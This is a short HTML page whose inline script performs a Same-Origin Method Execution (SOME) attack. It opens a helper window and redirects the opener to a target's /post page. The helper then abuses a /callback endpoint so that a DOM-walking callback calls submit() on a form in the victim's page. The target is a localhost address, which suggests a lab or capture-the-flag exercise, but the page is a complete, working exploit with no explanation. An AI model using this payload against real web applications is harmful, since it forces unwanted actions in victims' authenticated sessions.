<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>SOME</title>
</head>
<body>
<script>
const target = 'http://127.0.0.1:8001';
const callbackPath = 'opener.document.body.firstElementChild.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.submit';
const helper = window.open('', '_blank');
if (helper) {
  helper.document.write(`<!doctype html><script>
    const target = '${target}';
    const cb = '${callbackPath}';
    setTimeout(() => {
      location = target + '/callback?callback=' + encodeURIComponent(cb);
    }, 1500);
  <\/script>`);
  helper.document.close();
}
setTimeout(() => {
  window.location = target + '/post';
}, 300);
</script>
</body>
</html>
